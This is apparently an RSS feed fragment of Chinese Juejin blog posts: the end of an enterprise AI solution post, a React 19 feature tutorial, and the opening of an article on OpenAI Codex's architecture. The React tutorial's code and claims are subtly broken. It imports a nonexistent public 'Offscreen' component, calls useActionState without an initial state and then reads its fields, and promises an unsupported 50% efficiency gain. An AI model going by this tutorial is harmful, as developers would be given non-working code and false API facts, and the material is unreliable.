<p>Ooder 企业级 AI 解决方案通过“AI 大脑统筹调度- SkillFlow 管控流程- A2UI 生成交互- OneCode 支撑落地”的全链路协同，形成“需求输入-智能执行-结果输出-迭代优化”的价值闭环。该方案无需企业推倒原有系统，可与现有业务资产无缝兼容，既能让 AI 承接重复劳动、提升开发与业务效率，又能通过标准化与可控化设计保障系统安全与合规，最终帮助企业实现“AI 赋能业务、技术驱动增长”的核心目标。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 19 实战：5个新特性让你的开发效率提升50%！]]></title>    <link>https://juejin.cn/post/7592846242176958498</link>    <guid>https://juejin.cn/post/7592846242176958498</guid>    <pubDate>2026-01-09T04:17:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176958498" data-draft-id="7592912361302065187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 19 实战：5个新特性让你的开发效率提升50%！"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-01-09T04:17:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 19 实战：5个新特性让你的开发效率提升50%！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:17:14.000Z" title="Fri Jan 09 2026 04:17:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>React 19 实战：5个新特性让你的开发效率提升50%！</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>React 作为现代前端开发的标杆框架，每一次重大版本更新都会带来颠覆性的改进。React 19 也不例外，它在性能优化、开发者体验和功能扩展方面带来了多项令人振奋的新特性。本文将深入剖析 React 19 中最值得关注的 5 个新特性，并通过实战案例展示如何利用它们将开发效率提升至少 50%。无论你是 React 新手还是资深开发者，这些新特性都将显著改变你的开发方式。</p>
<hr/>
<h2 data-id="heading-2">React Server Components（RSC）的正式支持</h2>
<h3 data-id="heading-3"><strong>背景与痛点</strong></h3>
<p>传统的 React 应用通常在客户端渲染（CSR），这会导致首屏加载时间较长，SEO 不友好等问题。虽然 Next.js 等框架提供了服务端渲染（SSR）方案，但配置复杂且灵活性不足。</p>
<h3 data-id="heading-4"><strong>React Server Components（RSC）的解决方案</strong></h3>
<p>React 19 正式将 RSC 纳入核心功能，允许开发者在服务端直接渲染组件，无需发送多余的 JavaScript 到客户端。这不仅减少了 bundle size，还能显著提升首屏加载速度。</p>
<h3 data-id="heading-5"><strong>实战示例</strong></h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// ServerComponent.server.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServerComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 直接从数据库获取数据</span>
  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">fetchDataFromDB</span>();
  
<span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{data.title}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{data.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}
</code></pre>
<p>在客户端可以直接引用：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// ClientComponent.client.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ServerComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ServerComponent.server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ClientComponent</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ServerComponent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-6"><strong>效率提升点</strong></h3>
<ul>
<li><strong>减少客户端负担</strong>：逻辑和数据获取直接在服务端完成。</li>
<li><strong>更快的 TTI（Time to Interactive）</strong>：用户无需等待 JavaScript hydrate。</li>
</ul>
<hr/>
<h2 data-id="heading-7">Actions API：简化表单和数据提交</h2>
<h3 data-id="heading-8"><strong>背景与痛点</strong></h3>
<p>传统表单处理通常需要手动管理状态、错误处理和提交逻辑，代码冗余且容易出错。即使使用 Formik 或 React Hook Form，仍需额外依赖库。</p>
<h3 data-id="heading-9"><strong>Actions API的改进</strong></h3>
<p>React 19引入了<code>useActionState</code>和<code>useFormStatus</code>等新Hook，原生支持表单提交的状态管理、pending状态和错误处理。</p>
<h3 data-id="heading-10"><strong>实战示例</strong></h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useActionState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params">prevState, formData</span>) {
<span class="hljs-keyword">const</span> email = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">'email'</span>);
<span class="hljs-keyword">if</span> (!email.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@'</span>)) {
<span class="hljs-keyword">return</span> { <span class="hljs-attr">error</span>: <span class="hljs-string">'Invalid email'</span> };
}
<span class="hljs-comment">// Submit to server</span>
<span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">SignupForm</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">const</span> [state, submitAction] = <span class="hljs-title function_">useActionState</span>(submitForm);

<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{submitAction}</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
{state.error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{state.error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-11"><strong>效率提升点</strong></h3>
<ul>
<li><strong>减少样板代码</strong>：无需手动管理loading或error状态。</li>
<li><strong>内置乐观更新支持</strong>：未来版本可能直接集成乐观UI更新。</li>
</ul>
<hr/>
<h2 data-id="heading-12">Document Metadata的组件化支持</h2>
<h3 data-id="heading-13"><strong>背景与痛点</strong></h3>
<p>动态修改<code>&lt;title&gt;</code>或<code>&lt;meta&gt;</code>标签通常需要依赖<code>react-helmet</code>或手动操作DOM，代码分散且难以维护。</p>
<h3 data-id="heading-14"><strong>新特性改进</strong></h3>
<p>React19允许在组件树中直接定义文档元数据：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">HomePage</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Home | My App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"description"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"Welcome to my app"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home Page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/&gt;</span></span>
);
}
</code></pre>
<h3 data-id="heading-15"><strong>效率提升点</strong></h3>
<ul>
<li><strong>更好的可维护性</strong>：元数据与组件逻辑共存。</li>
<li><strong>SSR友好</strong>：自动处理服务端渲染时的标签注入。</li>
</ul>
<hr/>
<h2 data-id="heading-16">use Hook：统一数据加载模式</h2>
<h3 data-id="heading-17"><strong>背景与痛点</strong></h3>
<p>数据加载通常需要混合使用<code>useEffect</code>、第三方状态库和自定义Hook，导致代码碎片化。</p>
<h3 data-id="heading-18"><code>use</code> Hook的革命性设计</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { use } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(<span class="hljs-title function_">fetchUser</span>(userId)); <span class="hljs-comment">// Promise会被自动resolve</span>

<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-19"><strong>核心优势</strong></h3>
<ol>
<li><strong>同步写法处理异步逻辑</strong></li>
<li><strong>兼容Suspense边界</strong></li>
</ol>
<hr/>
<h2 data-id="heading-20">Offscreen Rendering：预渲染性能优化</h2>
<p>###技术原理
通过<code>&lt;Offscreen&gt;</code>组件实现：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Offscreen</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Offscreen</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"hidden"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HeavyComponent</span> /&gt;</span> {/*不会被实际渲染*/}
<span class="hljs-tag">&lt;/<span class="hljs-name">Offscreen</span>&gt;</span></span>
);
}
</code></pre>
<hr/>
<p>##总结</p>
<p>React19的五项革新从不同维度解决了前端开发的深层次痛点：</p>
<ol>
<li>RSC重塑了渲染模型边界</li>
<li>ActionsAPI重新定义了表单交互范式</li>
<li>Metadata组件化提升了内容管理效率</li>
<li><code>use</code>Hook统一了异步编程模型</li>
<li>Offscreen为复杂应用提供性能保障</li>
</ol>
<p>这些特性不是孤立存在而是相互增强的组合拳。例如RSC+Actions可以构建超高效率的全栈应用；use+Offscreen能实现智能的资源加载策略。</p>
<p>要完全发挥React19的威力需要转变思维模式：
-从"纯客户端"转向服务端/客户端协同开发
-从手动状态管理转向声明式API
-从关注细节实现转向关注业务逻辑</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI Codex 深入剖析：下一代 AI 编程助手的架构与原理]]></title>    <link>https://juejin.cn/post/7592921639464108074</link>    <guid>https://juejin.cn/post/7592921639464108074</guid>    <pubDate>2026-01-09T04:26:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592921639464108074" data-draft-id="7579995569689067554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI Codex 深入剖析：下一代 AI 编程助手的架构与原理"/> <meta itemprop="keywords" content="前端,OpenAI,AI编程"/> <meta itemprop="datePublished" content="2026-01-09T04:26:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="破茧68"/> <meta itemprop="url" content="https://juejin.cn/user/3817931570691031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI Codex 深入剖析：下一代 AI 编程助手的架构与原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817931570691031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    破茧68
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:26:17.000Z" title="Fri Jan 09 2026 04:26:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入剖析 OpenAI Codex：下一代 AI 编程助手的架构与原理</h2>
<blockquote>
<p>本文将带你深入了解 OpenAI Codex 的内部架构、设计思路和实现原理。无论你是初学者还是有经验的开发者，都能从中获得对 AI 编程助手的深刻理解。</p>
</blockquote>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-codex" title="#%E4%BB%80%E4%B9%88%E6%98%AF-codex">什么是 Codex？</a></li>
<li><a href="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88" title="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88">整体架构概览</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3" title="#%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3">核心特性详解</a></li>
<li><a href="#%E5%BA%95%E5%B1%82%E5%8D%8F%E8%AE%AE%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6" title="#%E5%BA%95%E5%B1%82%E5%8D%8F%E8%AE%AE%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6">底层协议与通信机制</a></li>
<li><a href="#%E8%AE%B0%E5%BF%86%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%AE%B0%E4%BD%8F%E5%AF%B9%E8%AF%9D" title="#%E8%AE%B0%E5%BF%86%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%AE%B0%E4%BD%8F%E5%AF%B9%E8%AF%9D">记忆系统：如何记住对话</a></li>
<li><a href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B7%A5%E7%A8%8B%E6%99%BA%E8%83%BD%E7%AE%A1%E7%90%86%E6%9C%89%E9%99%90%E7%9A%84%E8%84%91%E5%AE%B9%E9%87%8F" title="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B7%A5%E7%A8%8B%E6%99%BA%E8%83%BD%E7%AE%A1%E7%90%86%E6%9C%89%E9%99%90%E7%9A%84%E8%84%91%E5%AE%B9%E9%87%8F">上下文工程：智能管理有限的"脑容量"</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7%E7%B3%BB%E7%BB%9F%E8%AE%A9-ai-%E8%83%BD%E5%A4%9F%E5%8A%A8%E6%89%8B" title="#%E5%B7%A5%E5%85%B7%E7%B3%BB%E7%BB%9F%E8%AE%A9-ai-%E8%83%BD%E5%A4%9F%E5%8A%A8%E6%89%8B">工具系统：让 AI 能够"动手"</a></li>
<li><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E7%BB%99-ai-%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E6%B8%B8%E4%B9%90%E5%9C%BA" title="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E7%BB%99-ai-%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E6%B8%B8%E4%B9%90%E5%9C%BA">安全沙箱：给 AI 一个安全的"游乐场"</a></li>
<li><a href="#mcp-%E5%8D%8F%E8%AE%AE%E8%BF%9E%E6%8E%A5%E5%A4%96%E9%83%A8%E4%B8%96%E7%95%8C%E7%9A%84%E6%A1%A5%E6%A2%81" title="#mcp-%E5%8D%8F%E8%AE%AE%E8%BF%9E%E6%8E%A5%E5%A4%96%E9%83%A8%E4%B8%96%E7%95%8C%E7%9A%84%E6%A1%A5%E6%A2%81">MCP 协议：连接外部世界的桥梁</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86" title="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">执行策略：智能的权限管理</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-codex" title="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-codex">如何使用 Codex</a></li>
<li><a href="#%E6%80%BB%E7%BB%93" title="#%E6%80%BB%E7%BB%93">总结</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">什么是 Codex？</h3>
<p>想象一下，你有一个超级聪明的编程助手，它不仅能理解你的需求，还能直接帮你写代码、运行命令、修改文件。这就是 <strong>Codex</strong> —— OpenAI 推出的本地 AI 编程代理。</p>
